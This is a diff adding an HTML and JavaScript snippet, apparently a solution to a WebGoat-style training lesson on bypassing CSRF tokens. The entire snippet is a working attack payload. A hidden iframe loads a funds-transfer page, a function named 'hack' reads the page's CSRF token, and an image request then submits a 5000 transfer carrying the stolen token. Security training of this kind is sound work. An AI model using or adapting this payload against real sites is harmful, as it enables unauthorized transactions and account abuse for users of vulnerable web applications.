@@ -1,0 +1,9 @@
+<script>
+        function hack() {
+                var evilFrame = document.getElementById('evilFrame').contentDocument;
+                var token = evilFrame.getElementsByName('form')[0].CSRFToken.value;
+                var XSSImage = new Image();
+                XSSImage.src = "attack?Screen=803158781&menu=900&transferFunds=5000&CSRFToken=" + token;
+        }
+</script>
+<iframe id="evilFrame" src="attack?Screen=803158781&menu=900&transferFunds=main" onload="hack()" />
